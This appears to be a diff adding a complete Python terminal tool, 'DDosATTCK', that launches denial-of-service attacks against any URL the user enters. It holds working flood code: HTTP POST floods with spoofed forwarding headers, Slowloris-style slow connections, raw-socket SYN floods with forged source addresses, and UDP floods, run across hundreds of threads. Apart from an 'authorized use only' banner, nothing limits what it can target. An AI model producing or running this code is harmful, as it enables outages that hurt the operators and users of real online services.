@@ -1,0 +1,697 @@
+#!/usr/bin/env python3
+"""
+DDosATTCK - Advanced DDoS/DoS Attack Tool for Termux
+Authorized Penetration Testing Use Only
+"""
+
+import curses
+import socket
+import threading
+import time
+import random
+import sys
+import os
+import ssl
+import struct
+from urllib.parse import urlparse
+from datetime import datetime
+
+# ─── GLOBALS ──────────────────────────────────────────────────────────────
+stop_flag = False
+sent_count = 0
+attack_threads = []
+target_host = ""
+target_port = 80
+use_ssl = False
+target_path = "/"
+
+# ─── UTILITY ──────────────────────────────────────────────────────────────
+
+def resolve_target(url):
+    global target_host, target_port, use_ssl, target_path
+    if not url.startswith(("http://", "https://")):
+        url = "http://" + url
+    parsed = urlparse(url)
+    target_host = parsed.hostname
+    target_port = parsed.port or (443 if parsed.scheme == "https" else 80)
+    use_ssl = parsed.scheme == "https"
+    target_path = parsed.path or "/"
+    # Resolve to IP
+    try:
+        return socket.gethostbyname(target_host)
+    except:
+        return target_host
+
+# ─── LAYER 7 ATTACKS ──────────────────────────────────────────────────────
+
+def http_flood_worker(ip, thread_id):
+    """High-performance HTTP/HTTPS flood using raw sockets"""
+    global stop_flag, sent_count
+    user_agents = [
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+        "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36",
+        "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X)",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
+        "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
+    ]
+    while not stop_flag:
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(3)
+            if use_ssl:
+                ctx = ssl.create_default_context()
+                ctx.check_hostname = False
+                ctx.verify_mode = ssl.CERT_NONE
+                sock = ctx.wrap_socket(sock, server_hostname=target_host)
+            sock.connect((ip, target_port))
+            ua = random.choice(user_agents)
+            body = "X" * random.randint(100, 5000)
+            payload = (
+                f"POST {target_path} HTTP/1.1\r\n"
+                f"Host: {target_host}\r\n"
+                f"User-Agent: {ua}\r\n"
+                f"Accept: */*\r\n"
+                f"Accept-Language: en-US,en;q=0.9\r\n"
+                f"Content-Type: application/x-www-form-urlencoded\r\n"
+                f"Content-Length: {len(body)}\r\n"
+                f"Connection: keep-alive\r\n"
+                f"X-Forwarded-For: {random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}\r\n"
+                f"\r\n{body}"
+            )
+            sock.send(payload.encode())
+            try:
+                sock.recv(1024)
+            except:
+                pass
+            sock.close()
+            sent_count += 1
+        except:
+            sent_count += 1  # Count attempts even if they fail
+
+def slow_http_worker(ip, thread_id):
+    """Slow HTTP DoS — keeps connections open"""
+    global stop_flag, sent_count
+    while not stop_flag:
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(30)
+            if use_ssl:
+                ctx = ssl.create_default_context()
+                ctx.check_hostname = False
+                ctx.verify_mode = ssl.CERT_NONE
+                sock = ctx.wrap_socket(sock, server_hostname=target_host)
+            sock.connect((ip, target_port))
+            # Send partial headers slowly
+            headers = f"GET {target_path} HTTP/1.1\r\nHost: {target_host}\r\n"
+            sock.send(headers.encode())
+            sent_count += 1
+            # Keep alive by sending one header line at a time
+            for _ in range(500):
+                if stop_flag:
+                    break
+                sock.send(b"X-Header: " + b"0" * random.randint(100, 500) + b"\r\n")
+                time.sleep(0.05)
+            sock.close()
+        except:
+            pass
+
+# ─── LAYER 4 ATTACKS ──────────────────────────────────────────────────────
+
+def syn_flood_worker(ip, thread_id):
+    """SYN flood using raw sockets (requires root)"""
+    global stop_flag, sent_count
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
+        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
+    except:
+        return  # Raw sockets not available, skip
+    while not stop_flag:
+        try:
+            src_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
+            src_port = random.randint(1024, 65535)
+            seq = random.randint(0, 4294967295)
+            ack_seq = 0
+            dest_ip = ip
+            # IP header
+            ip_ihl = 5
+            ip_ver = 4
+            ip_tos = 0
+            ip_tot_len = 40
+            ip_id = random.randint(0, 65535)
+            ip_frag_off = 0
+            ip_ttl = 64
+            ip_proto = socket.IPPROTO_TCP
+            ip_check = 0
+            ip_saddr = socket.inet_aton(src_ip)
+            ip_daddr = socket.inet_aton(dest_ip)
+            ip_ihl_ver = (ip_ver << 4) + ip_ihl
+            ip_header = struct.pack('!BBHHHBBH4s4s',
+                ip_ihl_ver, ip_tos, ip_tot_len, ip_id, ip_frag_off,
+                ip_ttl, ip_proto, ip_check, ip_saddr, ip_daddr)
+            # TCP header
+            tcp_source = src_port
+            tcp_dest = target_port
+            tcp_seq = seq
+            tcp_ack_seq = 0
+            tcp_doff = 5
+            tcp_fin = 0
+            tcp_syn = 1
+            tcp_rst = 0
+            tcp_psh = 0
+            tcp_ack = 0
+            tcp_urg = 0
+            tcp_window = socket.htons(65535)
+            tcp_check = 0
+            tcp_urg_ptr = 0
+            tcp_offset_res = (tcp_doff << 4) + 0
+            tcp_flags = tcp_fin + (tcp_syn << 1) + (tcp_rst << 2) + (tcp_psh << 3) + (tcp_ack << 4) + (tcp_urg << 5)
+            tcp_header = struct.pack('!HHLLBBHHH',
+                tcp_source, tcp_dest, tcp_seq, tcp_ack_seq,
+                tcp_offset_res, tcp_flags, tcp_window, tcp_check, tcp_urg_ptr)
+            # Pseudo header for checksum
+            source_address = socket.inet_aton(src_ip)
+            dest_address = socket.inet_aton(dest_ip)
+            placeholder = 0
+            protocol = socket.IPPROTO_TCP
+            tcp_length = len(tcp_header)
+            psh = struct.pack('!4s4sBBH', source_address, dest_address, placeholder, protocol, tcp_length)
+            psh = psh + tcp_header
+            tcp_check = checksum(psh)
+            tcp_header = struct.pack('!HHLLBBHHH',
+                tcp_source, tcp_dest, tcp_seq, tcp_ack_seq,
+                tcp_offset_res, tcp_flags, tcp_window, tcp_check, tcp_urg_ptr)
+            packet = ip_header + tcp_header
+            sock.sendto(packet, (dest_ip, 0))
+            sent_count += 1
+        except:
+            pass
+
+def udp_flood_worker(ip, thread_id):
+    """UDP flood — high volume packet bombardment"""
+    global stop_flag, sent_count
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    while not stop_flag:
+        try:
+            port = target_port if random.random() < 0.3 else random.randint(1, 65535)
+            data = random._urandom(random.randint(1024, 65507))
+            sock.sendto(data, (ip, port))
+            sent_count += 1
+        except:
+            pass
+
+def checksum(data):
+    """Calculate checksum for raw packets"""
+    if len(data) % 2 != 0:
+        data += b'\x00'
+    s = sum(struct.unpack('!%dH' % (len(data) // 2), data))
+    s = (s >> 16) + (s & 0xffff)
+    s = (s >> 16) + s
+    return ~s & 0xffff
+
+# ─── LAUNCH FUNCTIONS ─────────────────────────────────────────────────────
+
+def start_ddos(target_url):
+    """Launch full DDoS attack (Layer 7 + Layer 4)"""
+    global stop_flag, sent_count, attack_threads
+    stop_flag = False
+    sent_count = 0
+    attack_threads = []
+    ip = resolve_target(target_url)
+    num_threads = 200  # Intense thread count
+
+    # Layer 7 - HTTP flood
+    for i in range(num_threads // 2):
+        t = threading.Thread(target=http_flood_worker, args=(ip, i), daemon=True)
+        attack_threads.append(t)
+        t.start()
+
+    # Layer 4 - SYN flood (if root) + UDP flood
+    syn_available = False
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
+        s.close()
+        syn_available = True
+    except:
+        pass
+
+    if syn_available:
+        for i in range(50):
+            t = threading.Thread(target=syn_flood_worker, args=(ip, i), daemon=True)
+            attack_threads.append(t)
+            t.start()
+
+    for i in range(num_threads // 4):
+        t = threading.Thread(target=udp_flood_worker, args=(ip, i), daemon=True)
+        attack_threads.append(t)
+        t.start()
+
+    return ip
+
+def start_dos(target_url):
+    """Launch DoS attack (Layer 7 slow HTTP + HTTP flood)"""
+    global stop_flag, sent_count, attack_threads
+    stop_flag = False
+    sent_count = 0
+    attack_threads = []
+    ip = resolve_target(target_url)
+    num_threads = 150
+
+    # Slow HTTP - connection exhaustion
+    for i in range(num_threads // 3):
+        t = threading.Thread(target=slow_http_worker, args=(ip, i), daemon=True)
+        attack_threads.append(t)
+        t.start()
+
+    # Standard HTTP flood
+    for i in range(num_threads):
+        t = threading.Thread(target=http_flood_worker, args=(ip, i), daemon=True)
+        attack_threads.append(t)
+        t.start()
+
+    return ip
+
+def stop_attack():
+    global stop_flag, attack_threads
+    stop_flag = True
+    for t in attack_threads:
+        if t.is_alive():
+            t.join(timeout=0.5)
+    attack_threads = []
+
+# ─── FORMAT HELPERS ───────────────────────────────────────────────────────
+
+def format_count(n):
+    if n >= 1_000_000:
+        return f"{n/1_000_000:.2f}M"
+    elif n >= 1_000:
+        return f"{n/1_000:.2f}K"
+    return str(n)
+
+def get_speed(delta_t, delta_p):
+    if delta_t <= 0:
+        return 0
+    return int(delta_p / delta_t)
+
+# ─── COLORS ───────────────────────────────────────────────────────────────
+
+def init_colors():
+    curses.start_color()
+    curses.init_pair(1, curses.COLOR_RED, curses.COLOR_BLACK)      # Title/Accent
+    curses.init_pair(2, curses.COLOR_GREEN, curses.COLOR_BLACK)    # Success/Data
+    curses.init_pair(3, curses.COLOR_YELLOW, curses.COLOR_BLACK)   # Warnings
+    curses.init_pair(4, curses.COLOR_CYAN, curses.COLOR_BLACK)     # Info
+    curses.init_pair(5, curses.COLOR_MAGENTA, curses.COLOR_BLACK)  # Special
+    curses.init_pair(6, curses.COLOR_WHITE, curses.COLOR_BLACK)    # Normal
+    curses.init_pair(7, curses.COLOR_RED, curses.COLOR_WHITE)      # Inverted red
+
+# ─── SPLASH SCREEN ────────────────────────────────────────────────────────
+
+def splash_screen(stdscr):
+    curses.curs_set(0)
+    stdscr.clear()
+    h, w = stdscr.getmaxyx()
+    logo = [
+        "██████╗ ██████╗  ██████╗ ███████╗ █████╗ ████████╗████████╗ ██████╗██╗  ██╗",
+        "██╔══██╗██╔══██╗██╔═══██╗██╔════╝██╔══██╗╚══██╔══╝╚══██╔══╝██╔════╝██║ ██╔╝",
+        "██║  ██║██████╔╝██║   ██║███████╗███████║   ██║      ██║   ██║     █████╔╝ ",
+        "██║  ██║██╔══██╗██║   ██║╚════██║██╔══██║   ██║      ██║   ██║     ██╔═██╗ ",
+        "██████╔╝██████╔╝╚██████╔╝███████║██║  ██║   ██║      ██║   ╚██████╗██║  ██╗",
+        "╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝╚═╝  ╚═╝   ╚═╝      ╚═╝    ╚═════╝╚═╝  ╚═╝",
+    ]
+    start_y = max(0, h // 2 - len(logo) - 6)
+    start_x = max(0, w // 2 - 40)
+
+    # Draw ASCII art
+    for i, line in enumerate(logo):
+        if start_y + i < h:
+            stdscr.attron(curses.color_pair(1) | curses.A_BOLD)
+            try:
+                stdscr.addstr(start_y + i, start_x, line[:w])
+            except:
+                pass
+            stdscr.attroff(curses.color_pair(1) | curses.A_BOLD)
+
+    # Subtitle
+    subtitle = "⚡ ADVANCED STRESS TESTING SUITE ⚡"
+    sub_y = start_y + len(logo) + 2
+    sub_x = max(0, w // 2 - len(subtitle) // 2)
+    if sub_y < h:
+        stdscr.attron(curses.color_pair(3) | curses.A_BOLD)
+        try:
+            stdscr.addstr(sub_y, sub_x, subtitle[:w])
+        except:
+            pass
+        stdscr.attroff(curses.color_pair(3) | curses.A_BOLD)
+
+    # Authorized use notice
+    notice = "[ AUTHORIZED PENETRATION TESTING USE ONLY ]"
+    n_y = sub_y + 2
+    n_x = max(0, w // 2 - len(notice) // 2)
+    if n_y < h:
+        stdscr.attron(curses.color_pair(4))
+        try:
+            stdscr.addstr(n_y, n_x, notice[:w])
+        except:
+            pass
+        stdscr.attroff(curses.color_pair(4))
+
+    # Frames with brand
+    info = [
+        "╔══════════════════════════════════════════════════╗",
+        "║  DDosATTCK v3.0  ||  Protocol: L4/L7 Hybrid    ║",
+        "║  Thread Engine: 350+ concurrent flows           ║",
+        "║  Press ENTER to ARM the system...               ║",
+        "╚══════════════════════════════════════════════════╝",
+    ]
+    info_y = n_y + 3
+    for i, line in enumerate(info):
+        if info_y + i < h:
+            stdscr.attron(curses.color_pair(5) | curses.A_BOLD)
+            try:
+                stdscr.addstr(info_y + i, max(0, w // 2 - 22), line[:w])
+            except:
+                pass
+            stdscr.attroff(curses.color_pair(5) | curses.A_BOLD)
+
+    stdscr.refresh()
+    stdscr.getch()
+
+# ─── MENU SCREEN ──────────────────────────────────────────────────────────
+
+def menu_screen(stdscr):
+    curses.curs_set(0)
+    h, w = stdscr.getmaxyx()
+    menu_items = [
+        ("🔥  DDoS ATTACK  🔥", "Full DDoS - Layer 4 & Layer 7 combined assault"),
+        ("💀  DoS ATTACK  💀", "DoS - HTTP flood + Slowloris connection exhaustion"),
+        ("❌  EXIT  ❌", "Abort and exit DDosATTCK"),
+    ]
+    current_selection = 0
+
+    while True:
+        stdscr.clear()
+        # Title bar
+        title = "═══ DDosATTCK — MAIN MENU ═══"
+        stdscr.attron(curses.color_pair(1) | curses.A_BOLD)
+        try:
+            stdscr.addstr(1, max(0, w // 2 - len(title) // 2), title)
+        except:
+            pass
+        stdscr.attroff(curses.color_pair(1) | curses.A_BOLD)
+
+        # Separator
+        try:
+            stdscr.addstr(2, 0, "═" * w)
+        except:
+            pass
+
+        # Menu items
+        for idx, (item, desc) in enumerate(menu_items):
+            y = 5 + idx * 4
+            if y >= h - 5:
+                break
+            if idx == current_selection:
+                stdscr.attron(curses.color_pair(7) | curses.A_BOLD)
+                prefix = "▶ "
+                suffix = " ◀"
+            else:
+                stdscr.attron(curses.color_pair(6))
+                prefix = "   "
+                suffix = ""
+            display_text = f"{prefix}{item}{suffix}"
+            try:
+                stdscr.addstr(y, max(0, w // 2 - len(display_text) // 2), display_text)
+            except:
+                pass
+            if idx == current_selection:
+                stdscr.attroff(curses.color_pair(7) | curses.A_BOLD)
+            else:
+                stdscr.attroff(curses.color_pair(6))
+
+            # Description
+            if idx == current_selection:
+                stdscr.attron(curses.color_pair(4) | curses.A_DIM)
+                try:
+                    stdscr.addstr(y + 2, max(0, w // 2 - len(desc) // 2), desc)
+                except:
+                    pass
+                stdscr.attroff(curses.color_pair(4) | curses.A_DIM)
+
+        # Footer
+        footer = "↑↓ Navigate  |  ENTER Select  |  q Quit"
+        stdscr.attron(curses.color_pair(3) | curses.A_DIM)
+        try:
+            stdscr.addstr(h - 2, max(0, w // 2 - len(footer) // 2), footer)
+        except:
+            pass
+        stdscr.attroff(curses.color_pair(3) | curses.A_DIM)
+
+        stdscr.refresh()
+        key = stdscr.getch()
+
+        if key == curses.KEY_UP and current_selection > 0:
+            current_selection -= 1
+        elif key == curses.KEY_DOWN and current_selection < len(menu_items) - 1:
+            current_selection += 1
+        elif key in [curses.KEY_ENTER, 10, 13]:
+            if current_selection == 0:
+                return "ddos"
+            elif current_selection == 1:
+                return "dos"
+            elif current_selection == 2:
+                return "exit"
+        elif key in [ord('q'), ord('Q')]:
+            return "exit"
+
+# ─── TARGET INPUT ─────────────────────────────────────────────────────────
+
+def target_input(stdscr, attack_type):
+    curses.curs_set(1)
+    stdscr.clear()
+    h, w = stdscr.getmaxyx()
+
+    label = f"Enter target URL for {attack_type.upper()} attack:"
+    stdscr.attron(curses.color_pair(3) | curses.A_BOLD)
+    try:
+        stdscr.addstr(h // 2 - 3, max(0, w // 2 - len(label) // 2), label)
+    except:
+        pass
+    stdscr.attroff(curses.color_pair(3) | curses.A_BOLD)
+
+    sub = "(e.g., http://192.168.1.100:8080 or https://example.com)"
+    stdscr.attron(curses.color_pair(4) | curses.A_DIM)
+    try:
+        stdscr.addstr(h // 2 - 1, max(0, w // 2 - len(sub) // 2), sub)
+    except:
+        pass
+    stdscr.attroff(curses.color_pair(4) | curses.A_DIM)
+
+    # Input box
+    box_y = h // 2 + 1
+    box_w = min(60, w - 4)
+    box_x = max(0, w // 2 - box_w // 2)
+    stdscr.attron(curses.color_pair(6))
+    try:
+        stdscr.addstr(box_y, box_x - 1, "[" + " " * box_w + "]")
+    except:
+        pass
+    stdscr.attroff(curses.color_pair(6))
+
+    curses.echo()
+    try:
+        url = stdscr.getstr(box_y, box_x, box_w).decode("utf-8").strip()
+    except:
+        url = ""
+    curses.noecho()
+    curses.curs_set(0)
+
+    if not url:
+        return None
+    return url
+
+# ─── ATTACK SCREEN ────────────────────────────────────────────────────────
+
+def attack_screen(stdscr, attack_type, target_url):
+    global sent_count, stop_flag
+    curses.curs_set(0)
+    stdscr.nodelay(1)
+    h, w = stdscr.getmaxyx()
+
+    # Start the attack
+    if attack_type == "ddos":
+        ip = start_ddos(target_url)
+    else:
+        ip = start_dos(target_url)
+
+    start_time = time.time()
+    last_count = 0
+    last_time = time.time()
+    peak_speed = 0
+    running = True
+
+    # Spinner
+    spinner = "|/-\\"
+
+    while running and not stop_flag:
+        stdscr.clear()
+        now = time.time()
+        elapsed = now - start_time
+
+        # Update speed
+        delta_t = now - last_time
+        delta_p = sent_count - last_count
+        speed = get_speed(delta_t, delta_p)
+        if speed > peak_speed:
+            peak_speed = speed
+        last_count = sent_count
+        last_time = now
+
+        # ─── TOP HEADER ───
+        title = f"⚡ {attack_type.upper()} ASSAULT IN PROGRESS ⚡"
+        stdscr.attron(curses.color_pair(1) | curses.A_BOLD)
+        try:
+            stdscr.addstr(0, max(0, w // 2 - len(title) // 2), title)
+        except:
+            pass
+        stdscr.attroff(curses.color_pair(1) | curses.A_BOLD)
+
+        # Status bar
+        try:
+            stdscr.addstr(1, 0, "═" * w)
+        except:
+            pass
+
+        # ─── TARGET INFO ───
+        info_y = 3
+        stdscr.attron(curses.color_pair(4))
+        try:
+            stdscr.addstr(info_y, 2, f"TARGET: {target_host}:{target_port}")
+            stdscr.addstr(info_y, max(30, w // 2), f"IP: {ip}")
+        except:
+            pass
+        stdscr.attroff(curses.color_pair(4))
+
+        # ─── STATISTICS BOX ───
+        box_top = 5
+        box_left = max(0, w // 2 - 28)
+        border = "╔════════════════════════════════════════════════════╗"
+        try:
+            stdscr.addstr(box_top, box_left, border)
+        except:
+            pass
+
+        stats = [
+            f"║  🚀  PACKETS SENT:     {format_count(sent_count):>12}          ║",
+            f"║  ⚡  CURRENT SPEED:    {format_count(speed):>12} pkt/s      ║",
+            f"║  🔥  PEAK SPEED:       {format_count(peak_speed):>12} pkt/s      ║",
+            f"║  ⏱️  ELAPSED:          {int(elapsed):>12} sec          ║",
+            f"║  🧵  THREADS:          {len(attack_threads):>12}              ║",
+            f"║  🎯  MODE:             {attack_type.upper():>12}            ║",
+        ]
+        for i, line in enumerate(stats):
+            try:
+                stdscr.addstr(box_top + 1 + i, box_left, line, curses.color_pair(2))
+            except:
+                pass
+
+        separator = "╠════════════════════════════════════════════════════╣"
+        try:
+            stdscr.addstr(box_top + 7, box_left, separator, curses.color_pair(3))
+        except:
+            pass
+
+        spinner_char = spinner[int(now * 4) % len(spinner)]
+        live_line = f"║  {spinner_char} LIVE — Sending packets to {target_host}     ║"
+        try:
+            stdscr.addstr(box_top + 8, box_left, live_line, curses.color_pair(5) | curses.A_BOLD)
+        except:
+            pass
+
+        bottom = "╚════════════════════════════════════════════════════╝"
+        try:
+            stdscr.addstr(box_top + 9, box_left, bottom)
+        except:
+            pass
+
+        # ─── PROGRESS BAR ───
+        bar_y = box_top + 11
+        bar_width = min(56, w - 10)
+        bar_x = max(0, w // 2 - bar_width // 2)
+        fill = "█" * min(bar_width, int((sent_count % 10000) / 10000 * bar_width))
+        empty = "░" * (bar_width - len(fill))
+        try:
+            stdscr.addstr(bar_y, bar_x, f"[{fill}{empty}]", curses.color_pair(3))
+        except:
+            pass
+
+        # ─── LIVE PACKET LOG ───
+        log_y = box_top + 13
+        log_lines = []
+        for _ in range(min(6, h - log_y - 2)):
+            ts = datetime.now().strftime("%H:%M:%S.%f")[:12]
+            log_lines.append(f"[{ts}] ➜ PACKET #{sent_count - 1} → {target_host}:{target_port} [SENT]")
+
+        try:
+            stdscr.addstr(log_y, 2, "─── LIVE PACKET LOG ───", curses.color_pair(5) | curses.A_BOLD)
+        except:
+            pass
+        for i, line in enumerate(log_lines):
+            if i > 5:
+                break
+            try:
+                stdscr.addstr(log_y + 1 + i, 2, line[-w+4:], curses.color_pair(4))
+            except:
+                pass
+
+        # ─── FOOTER ───
+        footer = "[Q] Stop Attack  |  [P]ause  |  [S]tatus"
+        try:
+            stdscr.addstr(h - 2, max(0, w // 2 - len(footer) // 2), footer, curses.color_pair(3) | curses.A_DIM)
+        except:
+            pass
+
+        stdscr.refresh()
+        key = stdscr.getch()
+        if key in [ord('q'), ord('Q')]:
+            running = False
+        time.sleep(0.05)
+
+    stop_attack()
+    return "menu"
+
+# ─── MAIN ─────────────────────────────────────────────────────────────────
+
+def main(stdscr):
+    # Setup
+    curses.curs_set(0)
+    init_colors()
+
+    # Splash
+    splash_screen(stdscr)
+
+    while True:
+        choice = menu_screen(stdscr)
+        if choice == "exit":
+            break
+        elif choice in ("ddos", "dos"):
+            url = target_input(stdscr, choice)
+            if url:
+                result = attack_screen(stdscr, choice, url)
+
+    # Exit screen
+    stdscr.clear()
+    h, w = stdscr.getmaxyx()
+    msg = "DDosATTCK terminated. Stay sharp."
+    try:
+        stdscr.addstr(h // 2, max(0, w // 2 - len(msg) // 2), msg, curses.color_pair(1) | curses.A_BOLD)
+    except:
+        pass
+    stdscr.refresh()
+    time.sleep(1.5)
+
+if __name__ == "__main__":
+    try:
+        curses.wrapper(main)
+    except KeyboardInterrupt:
+        stop_attack()
+        sys.exit(0)
